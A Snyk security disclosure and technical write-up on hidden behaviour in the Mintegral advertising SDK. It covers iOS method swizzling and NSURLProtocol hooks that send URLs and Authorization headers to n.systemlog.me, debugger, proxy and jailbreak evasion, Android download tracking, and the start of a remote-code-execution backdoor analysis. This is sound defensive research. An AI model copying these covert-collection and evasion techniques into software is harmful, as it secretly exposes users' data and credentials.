The Snyk research team is committed to helping secure developer ecosystems by researching and disclosing potential security exposures that would impact application developers. As part of this ongoing effort, Snyk has leveraged new information to conduct additional research into the Mintegral SDK. As a result of this research, additional findings have been uncovered.

The newest findings include the capability for Mintegral to execute code remotely via the SDK. Additionally, we‚Äôve worked with developers to assist in their responses to our disclosures and there have been notable reactions from both Mintegral and the mobile advertising community that are worth highlighting as well. This is an update on the events that have occurred since our [initial disclosure](/blog/sourmint-malicious-code-ad-fraud-and-data-leak-in-ios/) of the potential security and privacy issues we identified in the Mintegral advertising SDK.

**At a glance:**

* Snyk identified a potential backdoor functionality for Remote Code Execution via Ads presented by the SDK.
* We identified a hidden ‚Äúdownload tracking‚Äù functionality in the Android version of the SDK reporting back to Mintegral any downloads made from Google domain, including Applications (APK), Google Documents and other resources.
* Mintegral has taken numerous actions to respond to the concerns highlighted in our initial disclosures.
* Response from the mobile advertising community has been swift including multiple players removing Mintegral from their platforms.

## **Summary**

On August 24, 2020, Snyk announced the discovery of suspicious behaviors in the iOS version of a popular advertising SDK known as Mintegral. At that time, we had confirmed with partners in the advertising attribution space that at minimum, Mintegral appeared to be using this functionality to gather large amounts of data and commit ad attribution fraud. Our research showed that Mintegral was using code obfuscation and method swizzling to modify the functionality of base iOS SDK methods without the application owner‚Äôs knowledge. Further, our research proved that Mintegral was logging all HTTP requests including its headers which could even contain authorization tokens or other sensitive data.

Our discovery was widely reported across various press outlets and social media. As part of our research, we contacted the maintainers of some of the most popular apps that were affected by this SDK to inform them of our findings. We worked with a number of developers who asked for additional information and assistance in understanding the potential threats to their apps.

Since that time Mintegral announced that they were opening the source of their SDK to the market. While the SDK can (as of this writing) only be downloaded by registered partners, a major game publisher shared the source code with us for further analysis. We‚Äôve also continued our research by digging deeper into the Android versions of the SDK in which we hadn‚Äôt found similar behaviors at the time of our initial disclosure.

This has resulted in some significant discoveries that necessitate an update to our previous disclosure. Additionally, Mintegral and the community at large have responded to the situation, and we felt a summary of the events was a good way to finalize our research into this SDK.

## **New iOS findings**

### Remote Code Execution (RCE)

After Mintegral announced they were making their SDK open source, we analyzed the changes they made between the previous version that we had analyzed and the new version they released as open source. Through this comparison, we found significant changes that removed dangerous functionality that had existed in the previous versions. Most notably, we discovered a backdoor which previously allowed Mintegral to invoke any native static method within the application, but could also lead Mintegral to remotely execute code on any device displaying an ad through their SDK.

Not surprisingly, our analysis found that Mintegral removed the anti-debug and proxy detection that we had identified and [published in our previous disclosure](/blog/sourmint-malicious-code-ad-fraud-and-data-leak-in-ios/). However, through additional analysis we discovered they also removed six other classes that we hadn‚Äôt previously identified:

* `MTGCommandDispatcher`
* `MTGComponentCommands`
* `MTGRemoteCommand`
* `MTGRemoteCommandParameterModel`
* `MTGRemoteCommandParser`
* `MTGInvocationBoxing`

We found that `MTGBaseBridgeWebView`, which is used extensively in the SDK to communicate with JavaScript, introduces the ability to execute arbitrary functions and native application code. We were able to [build a proof of concept](/research/sour-mint-malicious-sdk/) that showed how the backdoor makes it possible for Mintegral to invoke any function and execute arbitrary code via the SDK. This is a significant compromise of device security model, and user‚Äôs privacy and stands in direct violation of Apple‚Äôs policy.

![](/_next/image/?url=https%3A%2F%2Fimg.youtube.com%2Fvi%2Fn-mEMkeoUqs%2Fsddefault.jpg&w=2560&q=75)

We disclosed our new findings to Apple on October, 2nd and one day later, on October 3rd Apple sent out a notification to affected app developers sharing that their app is exposed to remote code execution through Mintegral‚Äôs SDK class. The notification asked app developers to fix the issue and publish a new version within a week for expedited review.

### HTTP request and OpenURL tracking

After our [previous disclosure](/blog/sourmint-malicious-code-ad-fraud-and-data-leak-in-ios/), Mintegral had disabled the data collection methods via their remote configuration functionality. However, in our subsequent research we found they‚Äôve re-enabled that suspicious functionality a few weeks later. We observed this through several popular apps we initially sampled, but also confirmed this on a broader range of apps with the help of [NowSecure](https://www.nowsecure.com/).

The configuration served to the SDK during the initialization had all the 3 flags enabled:

* `cudl - HTTP request tracking`
* `cud - OpenURL tracking`
* `cspn - StoreKit methods tracking`

This means that for all apps with SDK older than 6.6.0.0, the extensive data collection and logging to Mintegral was active again. In many cases, this may happen without the developer‚Äôs consent, since this functionality of the SDK was always enabled, even if the developer or the mediation platform did not enable it.

## **Android SDK findings**

After completing our research and disclosure of the iOS SDK, our research team turned its attention to the Android versions. While initially we had seen indications that the Android version contained similar functionality, armed with this new information, a deeper inspection of the code resulted in new findings.¬† For all the technical details, please see the [technical research write up](/research/sour-mint-malicious-sdk/) of the Android version of the SDK.

First and foremost, the Snyk Research team found that various elements of the SDK code are being obfuscated using the same type of proprietary encoding mechanism that was used to obfuscate code in the iOS version of the SDK. Once again, while it looks similar to standard Base64 encoding, there are subtle differences that prevent using a typical Base64 encoder/decoder to decode the strings.

After using the SDK‚Äôs own internal utility to decode obfuscated strings and data, our researchers uncovered a number of methods that employ checks to determine if a debugger is running or if any type of intercepting proxy is running to capture network communications. As with the iOS version of the SDK, the logging behaviors of the Android SDK are switched off if either a debugger or network proxy is found. The same website the research team identified as the target for the logging of this data was also referenced in the Android SDK.

As the research team continued their investigation they were able to locate the implementation of a broadcast handler which listens for two intents. The first handler is part of the previously mentioned debug detection scheme. The second, `ACTION_PACKAGE_ADDED`, is fired when a new app is installed on the device. The code in the Mintegral SDK that runs as a result of this intent checks to see if a package was added. Ultimately, this allows the SDK to receive data on every application that gets installed on the device through the play store.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1630413320%2Fwordpress-sync%2Fblog-code-mIntegral-sdk.png&w=2560&q=75)*Code of the onReceive() method in the mIntegral sdk*

However, the SDK goes further and is also able to gather information on other downloads that happen outside of the play store. The AlphabObserver class, which extends the ContentObserver class, contains a method that captures URIs that are opened on the device. The method parses the URI to ensure that it is a download request and then if it is not already in the SDK‚Äôs app database, it adds it.

Ultimately, the behaviors are similar to what was seen in the iOS version of the SDK. However, the key difference is that because the SDK listens for a broadcast intent, it is able to receive data for app installations that were not initiated through the parent app in which the SDK was included. Essentially, if even one app on a user‚Äôs device leverages the Mintegral SDK, that instance of the SDK has visibility into every app install or downloads that occur on the device. The following video shows how a URL of a Google doc opened on the device is sent back to Mintegral.

![](/_next/image/?url=https%3A%2F%2Fimg.youtube.com%2Fvi%2Fo79R4fr2cho%2Fsddefault.jpg&w=2560&q=75)

Snyk has reported the details of our findings in the Mintegral SDK to Google who took the matter seriously and are continuing with their investigation. Google has confirmed that the technical analysis of the code that Snyk has provided is accurate. However, Google has not yet made any statement indicating if and how they intend to respond to the situation.

## **Community response**

Since our initial disclosure at the end of August, there has been considerable response from the ecosystem and the community. Mintregral, for their part, denied any wrongdoing. In a subsequent blog post, Mintegral indicated that the unusual level of data collection they perform was intended to help their SDK better tailor ads to the user. On or around August 26, 2020, Mintegral made a considerable number of changes to their privacy policy. In a later announcement, Mintegral shared that they were opening the source of their SDK to the market.

AppsFlyer and Singular, two major Mobile Measurement Providers (MMPs) responded with their [own analysis](https://www.appsflyer.com/blog/under-the-radar-fraud/) and implemented improvements to their anti-fraud product offerings to catch and prevent install hijacking attacks. Singular, released a [blog post](https://www.singular.net/blog/sourmint-ad-fraud/) titled ‚ÄúSourMint? Protecting yourself from click hijacking fraud on iOS‚Äù. In their post, they analyzed and found evidence of click hijacking activity in some SDK-based networks, and compared the rate of suspicious activity before and after our publication.

What they found was that before our disclosure, those apps showed a significant level of suspected hijacked clicks. However, after our disclosure was made public, they observed a dramatic decrease in fake clicks that happened within less than 24 hours from the publication time.

According to a notice on their website on September 3, 2020, Twitter‚Äôs mobile publishing and monetization platform MoPub removed mention of Mintegral as a network partner from their [announcement](https://www.mopub.com/en/blog/advanced_bidding_updates) originally published February 26, 2020. Additionally, in their [mediation documentation](https://developers.mopub.com/publishers/mediation/mopub-network-mediation/), MoPub now lists Mintegral as a deprecated network with the indication that it should be ‚Äúremoved from all inventory segments and line items‚Äù.

IronSource mediation platform also responded to the news of the SourMint disclosure. They stated:

> Recent reports raised serious allegations regarding Mintegral. ironSource conducted its own review, and, based on our findings, the ironSource mediation platform terminated all services and product support related to Mintegral.
>
> IronSource mediation platform

## **Conclusions**

Ultimately the situation with SourMint is very clear. It is undeniable that the Mintegral SDK uses various techniques to disguise the behavior of their SDK from developers, AppStore review, and independent security review. The hidden behaviors use techniques that allow the SDK to execute arbitrary code on iOS devices, and to access far greater data on user activity that would be necessary for ad attribution, exposing potentially private information to Mintegral. This data is accessed outside of the SDK itself making its collection very suspicious.

Throughout the years, the Snyk Security Research team has [identified and responsibly disclosed](/disclosed-vulnerabilities/) thousands of [vulnerabilities](/research/zip-slip-vulnerability/) in open source packages, [flagged](/blog/malicious-code-found-in-npm-package-event-stream/) the [malicious backdoor](/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/) in the very popular event-stream npm package, and covered several [other](/blog/malicious-packages-found-to-be-typo-squatting-in-pypi/) cases of [malicious components](/blog/publishing-malicious-packages/). Concluding the SourMint research, we‚Äôre happy to see the impact of our work, including the functionality we identified and disclosed being removed from the SDK, click hijacking and attribution fraud stopping, and the SDK getting open-sourced. Finally, we‚Äôre happy to see the increased awareness of the issue in the mobile development community, including companies in the mobile advertising world acting quickly to protect their users

For application developers, this highlights a need to ensure the trustworthiness of the monetization platforms they choose to use. Even with detailed code-level analysis, it can be very difficult to spot malicious or unanticipated behaviors. Responsibility for user notification of data collection ultimately falls on the application developer, so unknowingly including SDKs that access significant amounts of data such as this can cause the application owner to run afoul of app store policies. We hope that this disclosure has helped shed light on the bigger picture and that application developers have now greater awareness of the necessary steps to protect the private data of their users.

The Android SDK distributed by the company contains malicious functionality in this module that tracks:

1. Downloads from Google urls either within Google apps or via browser including file downloads, e-mail attachments and Google Docs links.
2. All apk downloads, either organic or not.
   Mintegral listens to download events in Android's download manager and detects if the downloaded file's url contains:

a. `google.com` or comes from a Google app (the `com.android.vending` package)

b. Ends with `.apk` for apk downloads

In both cases, the module sends the captured data back to Mintegral's servers.

Note that the malicious functionality keeps running even if the app is currently not in focus (running in the background).

4.7¬†medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed ‚Äúremotely exploitable‚Äù and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited. For example, a successful exploit may only be possible during the installation of an application by a system administrator.

  **Required**

* Scope (S)

  An exploited vulnerability can affect resources beyond the security scope managed by the security authority of the vulnerable component. In this case, the vulnerable component and the impacted component are different and managed by different security authorities.

  **Changed**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**

## [Overview](/blog/sour-mint-malicious-sdk/#overview)

The Mintegral SDK is a popular mobile app advertising SDK available for both the iOS and Android platforms. It is used by thousands of mobile apps with over a billion downloads per month. The SDK is used by application developers to monetize their apps with third-party ads.

The Snyk security research team has made two significant disclosures surrounding the Mintegral SDK. [The first disclosure](/blog/sourmint-malicious-code-ad-fraud-and-data-leak-in-ios/) was published in August 2020 and discovered excessive data collection and click hijacking that was performed on the iOS distribution of the SDK, [the second disclosure](/blog/remote-code-execution-rce-sourmint/) discovered a backdoor found on the iOS version of the SDK that allows remote code execution, along with some new findings on the Android distribution of the SDK.

The aim of this article is to share the technical details of our research and findings beyond what was covered in the blog posts.

This writeup is divided into three sections:

* Excessive Data Collection, including all HTTP request interception and logging in the iOS SDK - originally published on 24th of August 2020 - describes the URL and request tracking capabilities in the iOS distribution of the Mintegral SDK.
* A backdoor in the iOS distribution of the SDK allows Remote Code Execution - describes the remote code execution capabilities in MintegralAdSDK published on 15th of October 2020.
* Downloads URL tracking in Android - describes various findings in the Android distribution of the Mintegral SDK.

## [Excessive data collection on iOS [August 2020]](/blog/sour-mint-malicious-sdk/#data-collection)

### Overview

This part of the research was conducted on the binary version of Mintegral iOS SDK, since the open source version was not yet available to us in August 2020. The following research was conducted on version 6.3.5.0 of the SDK (for x86 arch) available for download [from GitHub](https://github.com/Mintegral-official/MintegralAdSDK-iOS-new/releases/tag/6.3.5.0).

We have identified that Mintegral iOS SDK versions 5.5.1 and above contain malicious functionality which leads to information leakage. In simple terms the SDK is spying on user link clicking, and network activity within the affected apps. The spying occurs even if the SDK was not enabled by the developer or the ad mediation platform, and the SDK attempts to hide the malicious behavior by identifying proxy, simulators and jail broken devices.

### Method swizzling

Mintegral SDK uses a technique called method swizzling to replace implementations of the `UIApplication openURL` and `SKStoreProductViewController loadProductWithParameters` methods at runtime, as well it registers a custom `NSURLProtocol` class.

These hooks are used to spy on application users by sending all the information about HTTP requests, opened URLs and App Store links they click on from within the application.

The HTTP request headers and URLs themself could contain sensitive data, but together with IDFA (Identifier for Advertisers), this data allows Mintegral to perform advertisement attribution fraud.

### Advertisement attribution fraud

To monetise their applications, developers often install advertising platforms. Advertising platforms receive revenue from advertisers for each installation happening after a user clicks on their advertisement. It is not uncommon for developers to use multiple advertising platforms in their aps. Therefore, to determine which ad platform should receive given attribution for the installation, each click gets registered to an attribution provider, a mobile measurement platform (MMP).

The figure below shows how the malicious functionality in Mintegral works. In this example, the user clicked on an advertisement from ‚ÄúAnother Platform‚Äù. But since Mintegral has an ability to intercept all URLs opened by the application it could perform additional requests to an attribution provider pretending that click actually happened by their advertisement. The full process works like this:

1. The user clicks a link from an in-app advertisement, served by a non-Mintegral ad network, to install a new application from the App Store.
2. The ad network‚Äôs SDK sends the click information to their back-end platform.
3. Having intercepted the click event via code injected into iOS event handlers through method swizzling, Mintegral logs the click data to their server.
4. The ad network registers a click notification with the attribution provider.
5. Mintegral registers a click notification with the attribution provider as well.

When the attribution provider attempts to match the install event to registered click notifications, it finds two that match. Using a last-touch attribution model, the Mintegral click notification is given the attribution and the click notification from the other ad network is rejected.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672811226%2Fblog-sourmint-writeup-diagram.png&w=1240&q=75)

Snyk worked with a major attribution provider to confirm that Mintegral is using the click data to generate false click notifications. Through their investigation, the provider was able to show that false click notifications were being generated and resulting in mis-attribution of ad clicks to Mintegral.

### Demo application

To demonstrate the attack, we setup a demo application.This will show the malicious `openURL` hook in action. We use a debugging proxy to intercept all network traffic.

To initialize the application we use the following code snippet from [the Mintegral documentation](http://cdn-adn.rayjump.com/cdn-adn/v2/markdown_v2/index.html?file=sdk-m_sdk-ios&lang=en):

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    [[MTGSDK sharedInstance] setAppID:@"xxxxxx" ApiKey:@"yyyyyyyyyyyyyyyyyyyyyyyyy"];
    return YES;
}
```

With the SDK initialized, we open example.com from the application using a button click:

```
- (IBAction)openURLWithOptions:(id)sender {
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"http://example.com?foo=bar&x=y"] options:@{} completionHandler:nil];
}
```

After launching the app, we immediately see a couple of requests from the Mintegral SDK in our proxy:

* `GET https://setting.rayjump.com/sdk/customid`
* `GET https://setting.rayjump.com/setting`
* `POST https://analytics.rayjump.com`

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812169%2Fblog-sourmint-writeup-requests.jpg&w=2560&q=75)
### Settings

The response from `https://setting.rayjump.com/setting`is a JSON object with many different options. Following table describes the most interesting fields for our research.

| **JSON Field** | **Description** |
| --- | --- |
| csw | Enable or disable anti-debugging functionality. |
| cou | Enable or disable `openURL` method hook. |
| cdai | URL to send the leaked information (\*). |
| cspn | Enable or disable hook on StoreKit methods. |
| cud | Enable or disable hook on NSURLProtocol. |
| cudl | URLs array to track via NSURLProtocol (\*\*). |

\* In our case it was `LdxThdi1WBK/WgfPhbxQYkeXHBPwHZKsYFh=` which is *https://n.systemlog.me/log* after decoding.

\*\* In our case it was `kBzuJd5/H+i/D+SMY7V/DFKwR0M0D+SMhBPthdSsHZPUYFT0+N==` which is `["itunes.apple.com","apps.apple.com"]` after decoding.

### Payload decoding

We can see two more requests after clicking the button which opens example.com. The first one is a GET request to http://example.com, as we would expect. The second one is a POST request to https://n.systemlog.me/log.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812290%2Fblog-sourmint-writeup-requests-2.png&w=2560&q=75)

The body of the request looks like it is base64 encoded. But in reality, it is not a base64 encoded string. The Mintergral SDK implements their own encoding and decoding logic which can be found in `+[MTGBase base64DecodeString:]` and  `+[MTGBase base64CleverDecodeString:]`. Note that `MTGBase` is not exposed in public headers of the SDK and not meant to be accessible for developers.

We use next code snippet to decode the payload:

```
Class cls = NSClassFromString(@"MTGBase");
NSObject *obj = [cls performSelector:NSSelectorFromString(@"base64CleverDecodeString:") withObject:@"THE REQUEST BODY HERE"];
NSLog(@"%@", obj);
```
![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812400%2Fblog-sourmint-writeup-payload.jpg&w=2560&q=75)

The payload contains a lot of data including IDFA, IDFV, OS version, user agent and so on. However, it also contains a field called ‚Äúclever‚Äù, which is, again, encoded. We can decode it using `base64DecodeString`:

```
[{'cn': 'ViewController', 'u': 'http://example.com?foo=bar&x=y', 'nid': 0, 'type': '3', 'mn': 'openURLWithOptions:', 'trc': '["2|awesomegame|0x0000000104102f18 -[ViewController openURLWithOptions:] + 152","3|UIKitCore|0x00007fff49326c1d -[UIApplication sendAction:to:from:forEvent:] + 83","4|UIKitCore|0x00007fff48cd5baa -[UIControl sendAction:to:forEvent:] + 223","5|UIKitCore|0x00007fff48cd5ef2 -[UIControl _sendActionsForEvents:withEvent:] + 396","6|UIKitCore|0x00007fff48cd4e63 -[UIControl touchesEnded:withEvent:] + 497"]'}]
```

As you can see it contains the URL, stack trace and some additional information like the controller and the method name.

### Going deeper

As was mentioned before - the Mintegral SDK is closed source. We are going to look at version 6.3.5.0 for x86 architecture.

The binary is a Macho executable that contains multiple other binaries. The code we‚Äôre interested in resides in `_CXX_CXX_OperationPKTask.o`.

Looking at the class, we see `+[_CXX_CXX_OperationPKTask load]` which [executes automatically](https://developer.apple.com/documentation/objectivec/nsobject/1418815-load?language=objc) when the class is added at runtime. That means if the SDK is installed via CocoaPods, malicious logic is going to be initialized regardless of whether developers actually use the SDK or not.

The `load` method performs a series of calls which lead us to `___cxxwebk_init_vw`. This method checks whether the anti-debug protection flag is enabled and initialises hooks if the flag is set to false or if debugging is disabled.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812504%2Fblog-sourmint-writeup-load.png&w=2560&q=75)

Initialization of the hooks depends on the settings request mentioned above. In the following table we see the relationships between response JSON fields and `MTGSetting` class:

| **JSON Field** | **MTGSetting Property** | **Description** |
| --- | --- | --- |
| csw | cSrtW | Enable or disable anti-debugging functionality. |
| cou | cOpenURL | Enable or disable `openURL` method hook. |
| cspn | cPackageName | Enable or disable hook on StoreKit methods. |

### Anti-debug logic

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812598%2Fblog-sourmint-writeup-anti-debug.png&w=2560&q=75)

The `__cxx_cxx_op_isInSuperViewFrame` function returns `true` in the following cases:

* Device platform is a ‚Äúsimulator‚Äù.
* Debugger is attached (implemented in `____mvpmvvm_isDebuggerAttached_block_invoke`).
* One of the files present on the device (indication of jailbreak):

  + /Applications/Cydia.app
  + /Library/MobileSubstrate/MobileSubstrate.dylib
  + /bin/bash
  + /usr/sbin/sshd
  + /etc/apt
  + /usr/bin/ssh
* Proxy is enabled (using `CFNetworkCopySystemProxySettings`).

### openURL method swizzling

The logic in the following screenshot is implemented in the `___cxxwebkmcouitninapo` method which is called from `___cxxwebk_init_vw` if the relevant flag is enabled.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812671%2Fblog-sourmint-writeup-swizzling.png&w=1240&q=75)

The above screenshot shows the method swizzling implementation. It performs the following calls:

1. `NSSelectorFromString`  to get a selector for the ‚ÄúopenURL:‚Äù method.
2. `NSClassFromString` to get a class descriptor for `UIApplication`.
3. `class_getInstanceMethod` to get the method descriptor.
4. `method_getImplementation` to get actual implementation of the method.
5. Then they define a code block which calls `_____cxxwebkmcouitninapo_block_invoke_2` and then calls the original `openURL`.
6. `method_setImplementation` to replace the original openURL with the code block from the previous step.

Almost the same happens for `openURL:options:completionHandler:` method except that they check the system version before doing so (the handler was first introduced in iOS 10).

At this point we had seen how the hook was applied. Next we will look at the implementation of the hook itself (`_____cxxwebkmcouitninapo_block_invoke_2`).

### The openURL hook implementation

Effectively, the implementation is located in the `___cxxwebkmcoulsz` method. There we can see one more anti-debug check call, then it checks the `__mc_notifyInHouse` flag and does nothing if this flag is 1.

This is done to ignore all marketing URLs clicked by a user **on a Mintegral served ad**. We can see relevant logic in `+[MTGBase mtgOpenURL:options:completionHandler:]` in the screenshot below:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812784%2Fblog-sourmint-writeup-openurl.png&w=1240&q=75)

Next piece of code shows that they also serialize the backtrace data and leak it in the payload they send to https://n.systemlog.me/log.

We are able to set a breakpoint at the `+[_CXX_CXX_OperationPKTask _cxx_cm_log_warnings:to:ins:]` call. You can see the call arguments on the next screenshot:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812889%2Fblog-sourmint-writeup-call.jpg&w=2560&q=75)

* The URL that was opened (http://example.com?foo=bar&x=y).
* The class where the click happened (`ViewController`).
* The method from within where the click happened (`openURLWithOptions:`).
* Backtrace info.

Another interesting function is `_nsh_id_by_cc`, which seems to be responsible for identifying competitor SDKs. Relevant logic shown in the next screenshot:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672813059%2Fblog-sourmint-writeup-nsh.jpg&w=2560&q=75)

Going back to `+[_CXX_CXX_OperationPKTask _cxx_cm_log_warnings:to:ins:]`, after the payload has been encoded via `+[MTGBase base64EncodeString:]` it creates a new code block and uses `_dispatch_async` to invoke it.

It leads to a series of calls with additional payload transformations and ends up in `-[_MC_ApiManager AFRequestWithUrl:paras:success:failure:]`, which makes a post request to `collectDomainUrl` from `MTGSetting` which is **https://n.systemlog.me/log** by default.

![](/_next/image/?url=https%3A%2F%2Fimg.youtube.com%2Fvi%2FMMuL5MaQeLM%2Fsddefault.jpg&w=2560&q=75)
### SKStoreProductViewController hook

`SKStoreProductViewController` is a view controller that provides a page where the user can purchase media from the App Store.

The `loadProductWithParameters:completionBlock:` method loads a new product screen to display.

Instead of going into technical details of the hook implementation we added next code snippet to the demo application:

```
- (IBAction)openSKStoreProductViewController:(id)sender {
    SKStoreProductViewController *storeViewController = [[SKStoreProductViewController alloc] init];
    [storeViewController setDelegate:self];
    NSDictionary *productParams = @{SKStoreProductParameterITunesItemIdentifier: [NSNumber numberWithInt:1234567890]};
    [storeViewController loadProductWithParameters:productParams completionBlock:nil];
}
```

As a result we see a POST request to *https://n.systemlog.me/log* with the next payload in the ‚Äúclever‚Äù field:

```
[{'cn': 'UIApplication', 'mn': 'sendAction:to:from:forEvent:', 'nid': 0, 'aid': '{"id":1234567890}', 'type': '2', 'trc': '["2|UIKitCore|0x00007fff49326c1d -[UIApplication sendAction:to:from:forEvent:] + 83","3|UIKitCore|0x00007fff48cd5baa -[UIControl sendAction:to:forEvent:] + 223","4|UIKitCore|0x00007fff48cd5ef2 -[UIControl _sendActionsForEvents:withEvent:] + 396","5|UIKitCore|0x00007fff48cd4e63 -[UIControl touchesEnded:withEvent:] + 497","6|UIKitCore|0x00007fff49362508 -[UIWindow _sendTouchesForEvent:] + 1359"]', 'dur': 24}]
```

As we can see the product ID is in the request Q.E.D.

### NSURLProtocol hook

`NSURLProtocol` class allows a developer to redefine how [Apple‚Äôs URL loading system](https://developer.apple.com/documentation/foundation/url_loading_system#//apple_ref/doc/uid/10000165-BCICJDHA) operates. The Mintegral SDK registers malicious implementation of `NSURLProtocol`, which can be configured remotely to intercept any outgoing requests made by an application and track URLs and HTTP headers including the *Authorization* header.

**For application developers it means that API tokens, cookies and basic authentication headers could potentially be collected by Mintegral.**

To understand how the SDK activates that part of the malicious code we have to look back to `___cxxwebk_init_vw`.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672813482%2Fblog-sourmint-writeup-cxxwebk.png&w=2560&q=75)

The above screenshot shows that the `cud` flag should be enabled and the `cudl` array shouldn‚Äôt be empty to activate the hook.

The following screenshot shows part of the `___cxxwebkterisiuuxx` function called from the above method.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672813568%2Fblog-sourmint-writeup-cxxwebkter.png&w=2560&q=75)

The code in the `___cxxwebkterisiuuxx` function performs the following actions:

1. Creates a class inherited from `NSURLProtocol`(`objc_registerClassPair`,`objc_allocateClassPair`).
2. Adds an implementation for `canInitWithRequest:` which is effectively an interceptor (`class_addMethod`).
3. Calls `+[NSURLProtocol registerClass:]` to register the class with the URL loading system.

In our research, we added the following code snippet to verify what data is collected by the malicious code:

```
- (IBAction)httpRequestWithURLSession:(id)sender {
    NSURLSessionConfiguration *sConf = [NSURLSessionConfiguration defaultSessionConfiguration];
    sConf.HTTPAdditionalHeaders = @{@"Authorization": @"Basic YWRtaW46YWRtaW4K"};
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sConf];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://example.com/get-secret-data"]];
    req.HTTPBody = [@"foo=bar" dataUsingEncoding:NSUTF8StringEncoding];
    req.HTTPMethod = @"POST";
    NSURLSessionDataTask *task = [session dataTaskWithRequest:req];
    [task resume];
}
```

As a result we see a POST request to *https://n.systemlog.me/log* with the following payload in the ‚Äúclever‚Äù field:

```
[{'cn': '', 'u': 'http://example.com/get-secret-data', 'mn': '', 'nid': 0, 'hhf': '{"Authorization":"Basic YWRtaW46YWRtaW4K","Content-Length":"7"}', 'type': '1', 'hm': 'POST'}]
```

In the request, we can see the URL and the authorization header. Although the request body is not included, headers often contain sensitive data. That data could even include personally identifiable information. For example, if an API uses JWT tokens, email or user name could be stored inside the token.

### Conclusion

During the research we observed many interesting techniques Mintegral developers use to hide the malicious behaviour of their SDK. As we can see, they activate hooks only on specific applications in specific regions which helped the malicious code stay there for more than one year without any attention.

Talking about timeline, the first version ([5.5.1](https://github.com/Mintegral-official/MintegralAdSDK-iOS/releases/tag/5.5.1)) of the malicious SDK was published on Jul 17, 2019. We found that all subsequent versions housed the same malicious functionality.

Many popular applications were affected by the malicious activities of this SDK. We hope this research shedding light on the situation will drive greater scrutiny and privacy controls for advertiser networks moving forward.

## [Remote Code Execution (RCE) on iOS [October 2020]](/blog/sour-mint-malicious-sdk/#rce)

### TLDR

We discovered the `MTGBaseBridgeWebView` class, used everywhere in the SDK to communicate with JavaScript, acts as a backdoor, allowing for the invocation of arbitrary functions from the native application code.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1671638862%2Fwordpress-sync%2FSourMint-Blog-2.png&w=2560&q=75)

In the picture above you can see a simplified schema of the remote code execution in action.

### Diff analysis

After [our first public disclosure](/blog/sourmint-malicious-code-ad-fraud-and-data-leak-in-ios/), Mintegral announced the release of [an open source version of the SDK](https://www.mintegral.com/en/blog/mintegral-sdk-going-open-source-for-increased-transparency-and-security/).

We went ahead and compared the new open source version, to the previous binary version distributed as cocoapod. While we didn‚Äôt have the source code for the older version, we could still compare the class names. To do that we extracted the `.o` files from the [binaries](https://github.com/Mintegral-official/MintegralAdSDK-iOS-new/releases/tag/6.5.0.0) and compared the symbols with the `.h` files of the open source version.

As expected, a previously discovered malicious `_CXX_CXX_OperationPKTask` component was indeed deleted but something else came up in the diff. The following classes caught our attention:

* MTGCommandDispatcher
* MTGComponentCommands
* MTGRemoteCommand
* MTGRemoteCommandParameterModel
* MTGRemoteCommandParser
* MTGInvocationBoxing

We decided to take a closer look at the binaries to understand what those files were used for.

### Affected versions

All versions of MintegralAdSDK prior to [6.5.0.0](https://github.com/Mintegral-official/MintegralAdSDK-iOS-new/releases/tag/6.5.0.0), inclusive. Version 6.6.0.0 published on the 10th of September 2020 doesn‚Äôt have the backdoor functionality described in this paper.

### The bridge implementation

We started by looking where the `MTGRemoteCommandParser` class is used and found only one place: `-(void)handleNativeObject:parameters:` in the `MTGBaseBridgeWebView` class.

From the implementation we can see that `-(void)handleNativeObject:parameters:` uses `MTGRemoteCommandParser` to parse the `parameters` argument and invokes the `-(void)dispatchCommand:feedback:` method in the `MTGCommandDispatcher` class.

At the first glance `-(void)handleNativeObject:parameters:` is not used, but that's not the case. Let‚Äôs see how it can be invoked from JavaScript code.

